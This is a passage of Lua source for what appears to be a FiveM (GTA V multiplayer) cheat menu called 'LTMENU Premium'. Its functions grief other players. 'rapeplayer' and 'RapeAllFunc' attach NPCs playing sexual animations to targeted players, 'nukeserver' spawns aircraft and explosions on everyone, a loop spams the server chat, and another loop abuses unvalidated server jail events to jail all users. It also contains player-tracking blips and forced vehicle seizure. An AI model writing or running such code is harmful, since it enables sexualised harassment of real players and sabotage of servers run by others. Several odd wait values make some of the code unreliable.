			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 9, 1)
		end
		
		if IsControlJustReleased(0, 172) or IsControlJustReleased(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 6, 2500)
		end

		if IsControlPressed(0, 173) and not IsControlPressed(0, 172) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 22, 1)
		end

		if IsControlPressed(0, 174) and IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 13, 1)
		end

		if IsControlPressed(0, 175) and IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 14, 1)
		end

		if IsControlPressed(0, 172) and IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 30, 100)
		end

		if IsControlPressed(0, 174) and IsControlPressed(0, 172) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 7, 1)
		end

		if IsControlPressed(0, 175) and IsControlPressed(0, 172) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 8, 1)
		end

		if IsControlPressed(0, 174) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 4, 1)
		end

		if IsControlPressed(0, 175) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 5, 1)
		end
	end
end

RCCar.DrawInstructions = function(distanceCheck)
	local steeringButtons = {
		{
			["label"] = "Right",
			["button"] = "~INPUT_CELLPHONE_RIGHT~"
		},
		{
			["label"] = "Forward",
			["button"] = "~INPUT_CELLPHONE_UP~"
		},
		{
			["label"] = "Reverse",
			["button"] = "~INPUT_CELLPHONE_DOWN~"
		},
		{
			["label"] = "Left",
			["button"] = "~INPUT_CELLPHONE_LEFT~"
		}
	}

	local pickupButton = {
		["label"] = "Delete",
		["button"] = "~INPUT_VEH_DUCK~"
	}
	
	local explodeButton = {
		["label"] = "Explode",
		["button"] = "~INPUT_VEH_FLY_ROLL_LEFT_ONLY~"
	}

	local buttonsToDraw = {
		{
			["label"] = "Toggle Camera",
			["button"] = "~INPUT_DETONATE~"
		}
	}

	if distanceCheck <= 10000000.0 then
		for buttonIndex = 1, #steeringButtons do
			local steeringButton = steeringButtons[buttonIndex]

			table.insert(buttonsToDraw, steeringButton)
		end

		if distanceCheck <= 1000000.0 then
			table.insert(buttonsToDraw, explodeButton)
		end
		
		if distanceCheck <= 1000000.0 then
			table.insert(buttonsToDraw, pickupButton)
		end
	end

    Citizen.CreateThread(function()
        local instructionScaleform = RequestScaleformMovie("instructional_buttons")

        while not HasScaleformMovieLoaded(instructionScaleform) do
            Wait(0)
        end

        PushScaleformMovieFunction(instructionScaleform, "CLEAR_ALL")
        PushScaleformMovieFunction(instructionScaleform, "TOGGLE_MOUSE_BUTTONS")
        PushScaleformMovieFunctionParameterBool(0)
        PopScaleformMovieFunctionVoid()

        for buttonIndex, buttonValues in ipairs(buttonsToDraw) do
            PushScaleformMovieFunction(instructionScaleform, "SET_DATA_SLOT")
            PushScaleformMovieFunctionParameterInt(buttonIndex - 1)

            PushScaleformMovieMethodParameterButtonName(buttonValues["button"])
            PushScaleformMovieFunctionParameterString(buttonValues["label"])
            PopScaleformMovieFunctionVoid()
        end

        PushScaleformMovieFunction(instructionScaleform, "DRAW_INSTRUCTIONAL_BUTTONS")
        PushScaleformMovieFunctionParameterInt(-1)
        PopScaleformMovieFunctionVoid()
        DrawScaleformMovieFullscreen(instructionScaleform, 255, 255, 255, 255)
    end)
end

-- 4x482

RCCar.Spawn = function()
	RCCar.LoadModels({ GetHashKey(RCCAR123), 68070371 })

	local spawnCoords, spawnHeading = GetEntityCoords(PlayerPedId()) + GetEntityForwardVector(PlayerPedId()) * 2.0, GetEntityHeading(PlayerPedId())

	RCCar.Entity = CreateVehicle(GetHashKey(RCCAR123), spawnCoords, spawnHeading, true)

	while not DoesEntityExist(RCCar.Entity) do
		Citizen.Wait(-1000)
	end

	RCCar.Driver = CreatePed(5, 68070371, spawnCoords, spawnHeading, true)

	SetEntityInvincible(RCCar.Driver, true)
	SetEntityVisible(RCCar.Driver, false)
	FreezeEntityPosition(RCCar.Driver, true)
	SetPedAlertness(RCCar.Driver, 0.0)
    SetVehicleNumberPlateText(RCCar.Entity, "LTMENU")
	TaskWarpPedIntoVehicle(RCCar.Driver, RCCar.Entity, -1)
   

	while not IsPedInVehicle(RCCar.Driver, RCCar.Entity) do
		Citizen.Wait(-1000)
	end

	RCCar.Attach("place")
end

RCCar.Attach = function(param)
	if not DoesEntityExist(RCCar.Entity) then
		return
	end
	
	RCCar.LoadModels({ "pickup_object" })

	if param == "place" then

		PlaceObjectOnGroundProperly(RCCar.Entity)
	elseif param == "pick" then
		if DoesCamExist(RCCar.Camera) then
			RCCar.ToggleCamera(false)
		end

		RCCar.Tablet(false)

		DeleteVehicle(RCCar.Entity)
		DeleteEntity(RCCar.Driver)

		RCCar.UnloadModels()
	end
end

RCCar.Tablet = function(boolean)
	if boolean then



	
		Citizen.CreateThread(function()
			while DoesEntityExist(RCCar.TabletEntity) do
				Citizen.Wait(-1000)
	

			end

			ClearPedTasks(PlayerPedId())
		end)
	else
		DeleteEntity(RCCar.TabletEntity)
	end
end

ConfigCamera = true

RCCar.ToggleCamera = function(boolean)
	if not ConfigCamera then return end

	if boolean then
		if not DoesEntityExist(RCCar.Entity) then return end 
		if DoesCamExist(RCCar.Camera) then DestroyCam(RCCar.Camera) end

		RCCar.Camera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)

		AttachCamToEntity(RCCar.Camera, RCCar.Entity, 0.0, 0.0, 0.4, true)

		Citizen.CreateThread(function()
			while DoesCamExist(RCCar.Camera) do
				Citizen.Wait(-1000)

				SetCamRot(RCCar.Camera, GetEntityRotation(RCCar.Entity))
			end
		end)

		local easeTime = 500 * math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(RCCar.Entity), true) / 10)

		RenderScriptCams(1, 1, easeTime, 1, 1)

		Citizen.Wait(easeTime)

	else
		local easeTime = 500 * math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(RCCar.Entity), true) / 10)

		RenderScriptCams(0, 1, easeTime, 1, 0)

		Citizen.Wait(easeTime)

		ClearTimecycleModifier()

		DestroyCam(RCCar.Camera)
	end
end

RCCar.LoadModels = function(models)
	for modelIndex = 1, #models do
		local model = models[modelIndex]

		if not RCCar.CachedModels then
			RCCar.CachedModels = {}
		end

		table.insert(RCCar.CachedModels, model)

		if IsModelValid(model) then
			while not HasModelLoaded(model) do
				RequestModel(model)
	
				Citizen.Wait(-1000)
			end
		else
			while not HasAnimDictLoaded(model) do
				RequestAnimDict(model)
	
				Citizen.Wait(-1000)
			end    
		end
	end
end

RCCar.UnloadModels = function()
	for modelIndex = 1, #RCCar.CachedModels do
		local model = RCCar.CachedModels[modelIndex]

		if IsModelValid(model) then
			SetModelAsNoLongerNeeded(model)
		else
			RemoveAnimDict(model)   
		end
	end
end

function KeyboardInput(TextEntry, ExampleText, MaxStringLength)
    AddTextEntry("FMMC_KEY_TIP9N", TextEntry .. ":")
    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP9N", "", ExampleText, "", "", "", MaxStringLength)
    blockinput = true

    while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
        Citizen.Wait(-1000)
    end

    if UpdateOnscreenKeyboard() ~= 2 then
        local result = GetOnscreenKeyboardResult()
        Citizen.Wait(-1000)
        blockinput = false
        return result
    else
        Citizen.Wait(-1000)
        blockinput = false
        return nil
    end
end

function DelVeh(veh)
    SetEntityAsMissionEntity(veh, 1, 1)
    DeleteEntity(veh)
end

function Clean(veh)
	SetVehicleDirtLevel(veh, 15.0)
end

function Clean2(veh)
	SetVehicleDirtLevel(veh, 1.0)
end

function GetInputMode()
    return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard" or "GamePad"
end

function TeleportToCoords()
    local x = KeyboardInput("Enter X Pos", "", 100)
    local y = KeyboardInput("Enter Y Pos", "", 100)
    local z = KeyboardInput("Enter Z Pos", "", 100)
    local entity
    if x ~= "" and y ~= "" and z ~= "" then
        if IsPedInAnyVehicle(GetPlayerPed(-1),0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1),0),-1)==GetPlayerPed(-1) then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1),0)
        else
            entity = PlayerPedId()
        end
        if entity then
            SetEntityCoords(entity, x + 0.5, y + 0.5, z + 0.5, 1,0,0,1)
        end
    else
        drawNotification("~r~Invalid Coordinates, are you fucking stupid?")
    end
end

function TeleportToWaypoint()
    if DoesBlipExist(GetFirstBlipInfoId(8)) then
        local blipIterator = GetBlipInfoIdIterator(8)
        local blip = GetFirstBlipInfoId(8, blipIterator)
        WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) 
        wp = true



        local zHeigt = 0.0
        height = 1000.0
        while true do
            Citizen.Wait(-1000)
            if wp then
                if
                    IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                        (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
                then
                    entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
                else
                    entity = GetPlayerPed(-1)
                end

                SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
                FreezeEntityPosition(entity, true)
                local Pos = GetEntityCoords(entity, true)

                if zHeigt == 0.0 then
                    height = height - 25.0
                    SetEntityCoords(entity, Pos.x, Pos.y, height)
                    bool, zHeigt = GetGroundZFor_3dCoord(Pos.x, Pos.y, Pos.z, 0)
                else
                    SetEntityCoords(entity, Pos.x, Pos.y, zHeigt)
                    FreezeEntityPosition(entity, false)
                    wp = false
                    height = 1000.0
                    zHeigt = 0.0
                    drawNotification("~g~Teleported to waypoint!")
                    break
                end
            end
        end
    else
        drawNotification("~r~You have no waypoint?!")
    end
end

function rapeplayer()
    Citizen.CreateThread(
        function()
            RequestModelSync('a_m_o_acult_01')
            RequestAnimDict('rcmpaparazzo_2')
            while not HasAnimDictLoaded('rcmpaparazzo_2') do
                Citizen.Wait(-1000)
            end
            if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
                while not NetworkHasControlOfEntity(veh) do
                    NetworkRequestControlOfEntity(veh)
                    Citizen.Wait(-1000)
                end
                SetEntityAsMissionEntity(veh, true, true)
                DeleteVehicle(veh)
                DeleteEntity(veh)
            end
            count = -0.2
            for b = 1, 3 do
                local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
                local bz = CreatePed(4, GetHashKey('a_m_o_acult_01'), x, y, z, 0.0, true, false)
                SetEntityAsMissionEntity(bz, true, true)
                AttachEntityToEntity(
                    bz,
                    GetPlayerPed(SelectedPlayer),
                    4103,
                    11816,
                    count,
                    0.00,
                    0.0,
                    0.0,
                    0.0,
                    0.0,
                    false,
                    false,
                    false,
                    false,
                    2,
                    true
                )
                ClearPedTasks(GetPlayerPed(SelectedPlayer))
                TaskPlayAnim(
                    GetPlayerPed(SelectedPlayer),
                    'rcmpaparazzo_2',
                    'shag_loop_poppy',
                    2.0,
                    2.5,
                    -1,
                    49,
                    0,
                    0,
                    0,
                    0
                )
                SetPedKeepTask(bz)
                TaskPlayAnim(bz, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                SetEntityInvincible(bz, true)
                count = count - 0.4
            end
        end
    )
end

function CreateDeer()
	local Model = GetHashKey("a_c_deer")
	RequestModel(Model)
	while not HasModelLoaded(Model) do
		Citizen.Wait(50)
	end

	local Ped = PlayerPedId()
	local PedPosition = GetEntityCoords(Ped, false)

	Handle = CreatePed(28, Model, PedPosition.x+1, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)

	SetPedCanRagdoll(Handle, Animal.Ragdoll)
	SetEntityInvincible(Handle, Animal.Invincible)
    SetPedDefaultComponentVariation(Handle)
	SetModelAsNoLongerNeeded(Model)
end

function RapeAllFunc()
    for bs=0,9 do
        TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"You just got fucked mate")
    end
    Citizen.CreateThread(function()
        for i=0,128 do
            RequestModelSync("a_m_o_acult_01")
            RequestAnimDict("rcmpaparazzo_2")
            while not HasAnimDictLoaded("rcmpaparazzo_2")do
                Citizen.Wait(-1000)
            end
            if IsPedInAnyVehicle(GetPlayerPed(i),true)then
                local veh=GetVehiclePedIsIn(GetPlayerPed(i),true)
                while not NetworkHasControlOfEntity(veh)do
                    NetworkRequestControlOfEntity(veh)
                    Citizen.Wait(-1000)
                end
                SetEntityAsMissionEntity(veh,true,true)
                DeleteVehicle(veh)DeleteEntity(veh)end
                count=-0.2
                for b=1,3 do
                    local x,y,z=table.unpack(GetEntityCoords(GetPlayerPed(i),true))
                    local bD=CreatePed(4,GetHashKey("a_m_o_acult_01"),x,y,z,0.0,true,false)
                    SetEntityAsMissionEntity(bD,true,true)
                    AttachEntityToEntity(bD,GetPlayerPed(i),4103,11816,count,0.00,0.0,0.0,0.0,0.0,false,false,false,false,2,true)
                    ClearPedTasks(GetPlayerPed(i))TaskPlayAnim(GetPlayerPed(i),"rcmpaparazzo_2","shag_loop_poppy",2.0,2.5,-1,49,0,0,0,0)
                    SetPedKeepTask(bD)TaskPlayAnim(bD,"rcmpaparazzo_2","shag_loop_a",2.0,2.5,-1,49,0,0,0,0)
                    SetEntityInvincible(bD,true)count=count-0.4
            end
        end
    end)
end

function teleportToNearestVehicle()
            local playerPed = GetPlayerPed(-1)
            local playerPedPos = GetEntityCoords(playerPed, true)
            local NearestVehicle = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 4)
            local NearestVehiclePos = GetEntityCoords(NearestVehicle, true)
            local NearestPlane = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 16384)
            local NearestPlanePos = GetEntityCoords(NearestPlane, true)
        drawNotification("~y~Wait...")
        Citizen.Wait(1000)
        if (NearestVehicle == 0) and (NearestPlane == 0) then
            drawNotification("~r~No Vehicle Found")
        elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
            if IsVehicleSeatFree(NearestPlane, -1) then
                SetPedIntoVehicle(playerPed, NearestPlane, -1)
                SetVehicleAlarm(NearestPlane, false)
                SetVehicleDoorsLocked(NearestPlane, 1)
                SetVehicleNeedsToBeHotwired(NearestPlane, false)
            else
                local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
                ClearPedTasksImmediately(driverPed)
                SetEntityAsMissionEntity(driverPed, 1, 1)
                DeleteEntity(driverPed)
                SetPedIntoVehicle(playerPed, NearestPlane, -1)
                SetVehicleAlarm(NearestPlane, false)
                SetVehicleDoorsLocked(NearestPlane, 1)
                SetVehicleNeedsToBeHotwired(NearestPlane, false)
            end
            drawNotification("~g~Teleported Into Nearest Vehicle!")
        elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
            if IsVehicleSeatFree(NearestVehicle, -1) then
                SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                SetVehicleAlarm(NearestVehicle, false)
                SetVehicleDoorsLocked(NearestVehicle, 1)
                SetVehicleNeedsToBeHotwired(NearestVehicle, false)
            else
                local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
                ClearPedTasksImmediately(driverPed)
                SetEntityAsMissionEntity(driverPed, 1, 1)
                DeleteEntity(driverPed)
                SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                SetVehicleAlarm(NearestVehicle, false)
                SetVehicleDoorsLocked(NearestVehicle, 1)
                SetVehicleNeedsToBeHotwired(NearestVehicle, false)
            end
            drawNotification("~g~Teleported Into Nearest Vehicle!")
        elseif (NearestVehicle ~= 0) and (NearestPlane ~= 0) then
            if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
                if IsVehicleSeatFree(NearestVehicle, -1) then
                    SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                    SetVehicleAlarm(NearestVehicle, false)
                    SetVehicleDoorsLocked(NearestVehicle, 1)
                    SetVehicleNeedsToBeHotwired(NearestVehicle, false)
                else
                    local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
                    ClearPedTasksImmediately(driverPed)
                    SetEntityAsMissionEntity(driverPed, 1, 1)
                    DeleteEntity(driverPed)
                    SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                    SetVehicleAlarm(NearestVehicle, false)
                    SetVehicleDoorsLocked(NearestVehicle, 1)
                    SetVehicleNeedsToBeHotwired(NearestVehicle, false)
                end
            elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
                if IsVehicleSeatFree(NearestPlane, -1) then
                    SetPedIntoVehicle(playerPed, NearestPlane, -1)
                    SetVehicleAlarm(NearestPlane, false)
                    SetVehicleDoorsLocked(NearestPlane, 1)
                    SetVehicleNeedsToBeHotwired(NearestPlane, false)
                else
                    local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
                    ClearPedTasksImmediately(driverPed)
                    SetEntityAsMissionEntity(driverPed, 1, 1)
                    DeleteEntity(driverPed)
                    SetPedIntoVehicle(playerPed, NearestPlane, -1)
                    SetVehicleAlarm(NearestPlane, false)
                    SetVehicleDoorsLocked(NearestPlane, 1)
                    SetVehicleNeedsToBeHotwired(NearestPlane, false)
                end
            end
            drawNotification("~g~Teleported Into Nearest Vehicle!")
        end

    end



	local function d(e)
    local f = {}
    local h = GetGameTimer() / 200
    f.r = math.floor(math.sin(h * e + 0) * 127 + 128)
    f.g = math.floor(math.sin(h * e + 2) * 127 + 128)
    f.b = math.floor(math.sin(h * e + 4) * 127 + 128)
    return f
end
	
local cL = true
local cM = false
local cN = true
local cO = true
Citizen.CreateThread(
    function()
        while true do
            Wait(1)
            for f = 0, 128 do
                if NetworkIsPlayerActive(f) and GetPlayerPed(f) ~= GetPlayerPed(-1) then
                   local ped = GetPlayerPed(f)
                    blip = GetBlipFromEntity(ped)
                    x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                    x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(f), true))
                    distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true))
                    headId = Citizen.InvokeNative(0xBFEFE3321A3F5015, ped, GetPlayerName(f), false, false, '', false)
                    wantedLvl = GetPlayerWantedLevel(f)
                    if cM then
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, true)
                        if wantedLvl then
                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, true)
                            Citizen.InvokeNative(0xCF228E2AA03099C3, headId, wantedLvl)
                        else
                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false)
                        end
                    else
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false)
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 9, false)
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, false)
                    end
                    if cL then
                        if not DoesBlipExist(blip) then
                            blip = AddBlipForEntity(ped)
                            SetBlipSprite(blip, 1)
                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                            SetBlipNameToPlayerName(blip, f)
                        else
                            veh = GetVehiclePedIsIn(ped, false)
                            blipSprite = GetBlipSprite(blip)
                            if not GetEntityHealth(ped) then
                                if blipSprite ~= 274 then
                                    SetBlipSprite(blip, 274)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    SetBlipNameToPlayerName(blip, f)
                                end
                            elseif veh then
                                vehClass = GetVehicleClass(veh)
                                vehModel = GetEntityModel(veh)
                                if vehClass == 15 then
                                    if blipSprite ~= 422 then
                                        SetBlipSprite(blip, 422)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, f)
                                    end
                                elseif vehClass == 16 then
                                    if
                                        vehModel == GetHashKey('besra') or vehModel == GetHashKey('hydra') or
                                            vehModel == GetHashKey('lazer')
                                     then
                                        if blipSprite ~= 424 then
                                            SetBlipSprite(blip, 424)
                                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                            SetBlipNameToPlayerName(blip, f)
                                        end
                                    elseif blipSprite ~= 423 then
                                        SetBlipSprite(blip, 423)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    end
                                elseif vehClass == 14 then
                                    if blipSprite ~= 427 then
                                        SetBlipSprite(blip, 427)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    end
                                elseif
                                    vehModel == GetHashKey('insurgent') or vehModel == GetHashKey('insurgent2') or
                                        vehModel == GetHashKey('limo2')
                                 then
                                    if blipSprite ~= 426 then
                                        SetBlipSprite(blip, 426)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, f)
                                    end
                                elseif vehModel == GetHashKey('rhino') then
                                    if blipSprite ~= 421 then
                                        SetBlipSprite(blip, 421)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, f)
                                    end
                                elseif blipSprite ~= 1 then
                                    SetBlipSprite(blip, 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                                    SetBlipNameToPlayerName(blip, f)
                                end
                                passengers = GetVehicleNumberOfPassengers(veh)
                                if passengers then
                                    if not IsVehicleSeatFree(veh, -1) then
                                        passengers = passengers + 1
                                    end
                                    ShowNumberOnBlip(blip, passengers)
                                else
                                    HideNumberOnBlip(blip)
                                end
                            else
                                HideNumberOnBlip(blip)
                                if blipSprite ~= 1 then
                                    SetBlipSprite(blip, 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                                    SetBlipNameToPlayerName(blip, f)
                                end
                            end
                            SetBlipRotation(blip, math.ceil(GetEntityHeading(veh)))
                            SetBlipNameToPlayerName(blip, f)
                            SetBlipScale(blip, 0.85)
                            if IsPauseMenuActive() then
                                SetBlipAlpha(blip, 255)
                            else
                                x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                                x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(f), true))
                                distance =
                                    math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1) +
                                    900
                                if distance < 0 then
                                    distance = 0
                                elseif distance > 255 then
                                    distance = 255
                                end
                                SetBlipAlpha(blip, distance)
                            end
                        end
                    else
                        RemoveBlip(blip)
                    end
                end
            end
        end
    end
)

function ShootPlayer(player)
    local head = GetPedBoneCoords(player, GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.0, 0.0)
    SetPedShootsAtCoord(PlayerPedId(), head.x, head.y, head.z, true)
end


function SpawnObjOnPlayer(modelHash)
    local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
    local obj CreateObject(modelHash, coords.x, coords.y, coords.z, true, true, true)
        if attachProp then
            AttachEntityToEntity(obj ,GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true ,true ,false, true, 1, true)
        end
end

function nukeserver()
    Citizen.CreateThread(function()
        local dg="Avenger"
        local dh="CARGOPLANE"
        local di="luxor"
        local dj="maverick"
        local dk="blimp2"

        while not HasModelLoaded(GetHashKey(dh))do
            Citizen.Wait(-1000)
            RequestModel(GetHashKey(dh))
        end

        while not HasModelLoaded(GetHashKey(di))do
            Citizen.Wait(-1000)RequestModel(GetHashKey(di))
        end

        while not HasModelLoaded(GetHashKey(dg))do
            Citizen.Wait(-1000)RequestModel(GetHashKey(dg))
        end

        while not HasModelLoaded(GetHashKey(dj))do
            Citizen.Wait(-1000)RequestModel(GetHashKey(dj))
        end

        while not HasModelLoaded(GetHashKey(dk))do
            Citizen.Wait(-1000)RequestModel(GetHashKey(dk))
        end

        for bs=0,9 do
            TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"LTMENU Premium")
        end

        for i=0,128 do
            local di=CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+2.0,true,true) and CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dg),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dh),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(di),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dj),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dk),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,100000.0)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,true)
        end
     end)
    end

function rotDirection(rot)
    local radianz = rot.z * 0.0174532924
    local radianx = rot.x * 0.0174532924
    local num = math.abs(math.cos(radianx))

    local dir = vector3(-math.sin(radianz) * num, math.cos(radianz) * num, math.sin(radianx))

    return dir
end

function GetDistance(pointA, pointB)

    local aX = pointA.x
    local aY = pointA.y
    local aZ = pointA.z

    local bX = pointB.x
    local bY = pointB.y
    local bZ = pointB.z

    local xBA = bX - aX
    local yBA = bY - aY
    local zBA = bZ - aZ

    local y2 = yBA * yBA
    local x2 =  xBA * xBA
    local sum2 = y2 + x2

    return math.sqrt(sum2 + zBA)
end

function getPosition()
  local x,y,z = table.unpack(GetEntityCoords(GetPlayerPed(-1),true))
  return x,y,z
end

function getCamDirection()
  local heading = GetGameplayCamRelativeHeading()+GetEntityHeading(GetPlayerPed(-1))
  local pitch = GetGameplayCamRelativePitch()

  local x = -math.sin(heading*math.pi/180.0)
  local y = math.cos(heading*math.pi/180.0)
  local z = math.sin(pitch*math.pi/180.0)

  local len = math.sqrt(x*x+y*y+z*z)
  if len ~= 0 then
    x = x/len
    y = y/len
    z = z/len
  end

  return x,y,z
end

function RotToDirection(rot)
    local radiansZ = rot.z * 0.0174532924
    local radiansX = rot.x * 0.0174532924
    local num = math.abs(math.cos(radiansX))
    local dir = vector3(-math.sin(radiansZ) * num, math.cos(radiansZ * num), math.sin(radiansX))
    return dir
end

function add(a, b)
    local result = vector3(a.x + b.x, a.y + b.y, a.z + b.z)

    return result
end

function multiply(coords, coordz)
    local result = vector3(coords.x * coordz, coords.y * coordz, coords.z * coordz)

    return result
end

function SpectatePlayer(player)
    local playerPed = PlayerPedId()
    Spectating = not Spectating
    local targetPed = GetPlayerPed(player)

    if (Spectating) then
        local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

        RequestCollisionAtCoord(targetx, targety, targetz)
        NetworkSetInSpectatorMode(true, targetPed)

        drawNotification("~r~Spectating " .. GetPlayerName(player))
    else
        local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

        RequestCollisionAtCoord(targetx, targety, targetz)
        NetworkSetInSpectatorMode(false, targetPed)

        drawNotification("~r~Stopped Spectating " .. GetPlayerName(player))
    end
end

Citizen.CreateThread(
    function()
        while true do
            Citizen.Wait(-1000)

            DisplayRadar(true)

            SetPlayerWantedLevel(PlayerId(), 0, false)

            SetPlayerWeaponDamageModifier(PlayerId(), selectedDamage)
            SetPlayerMeleeWeaponDamageModifier(PlayerId(), selectedDamage)

            if infStamina then
                RestorePlayerStamina(PlayerId(), 1.0)
            end
			
			if chatspam then
                TriggerServerEvent(
                    '_chat:messageEntered',
                    'LTMENU',
                    {0, 0x99, 255},
                    '/ooc LT PREMIUM'
                )
                TriggerServerEvent('_chat:messageEntered', '^8LTMENU Premium', {0, 0x99, 255}, '^3 LTMENU Premium LTMENU ON YOUTUBE')
				else
				
            end
	
			if banallusers then
				for i = 0, 128 do
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "~r~LTMENU ON YOUTUBE")
